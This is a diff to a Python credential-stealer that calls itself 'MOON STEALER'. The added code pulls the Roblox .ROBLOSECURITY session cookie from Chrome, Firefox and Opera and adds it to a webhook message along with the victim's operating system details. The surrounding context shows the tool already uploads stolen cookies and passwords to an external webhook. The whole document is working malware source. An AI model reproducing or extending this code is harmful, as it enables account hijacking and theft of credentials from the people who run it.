@@ -23,6 +23,9 @@ from datetime import datetime
 from geopy.geocoders import Nominatim
 from selenium import webdriver
 import json
+import browser_cookie3
+import time
+import sys
 
 if os.name == "nt":
     pass
@@ -30,10 +33,6 @@ if os.name == "nt":
 else:
     print("Your operating system is not supported.")
     quit()
-
-
-import time
-import sys
 
 hook = "X"
 DETECTED = False
@@ -533,7 +532,7 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "MOON︰Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [MOONCookies.txt]({link})",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: ︰ **{CookiCount}** Cookies Found\n:link: ︰ [MOONCookies.txt]({link})",
                     "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
@@ -559,7 +558,7 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "MOON︰Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [MOONPassword.txt]({link})",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 ︰ **{PasswCount}** Passwords Found\n:link: ︰ [MOONPassword.txt]({link})",
                     "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
@@ -1243,6 +1242,44 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
+
+def chrome_logger():
+    global cookie
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+
+    except:
+        pass
+
+def firefox_logger():
+    global cookie
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        
+
+    except:
+        pass
+
+def opera_logger():
+    global cookie
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+
+    except:
+        pass
+
+browsers = [chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
+
+
 ipify = "https://api.ipify.org/"
 response = requests.get(ipify)
 soup = BeautifulSoup(response.text, "html.parser")
@@ -1260,8 +1297,8 @@ message = {
             "color": 12632256,
             "fields": [
                 {
-                    "name": "Device Info",
-                    "value": f"Operating System: {os_name} {os_version} {os_architecture}\n",
+                    "name": "-",
+                    "value": f"OS: **{os_name} {os_version} {os_architecture}**\nRoblox Cookie: `{cookie}`",
                 }
             ],
             "footer": {
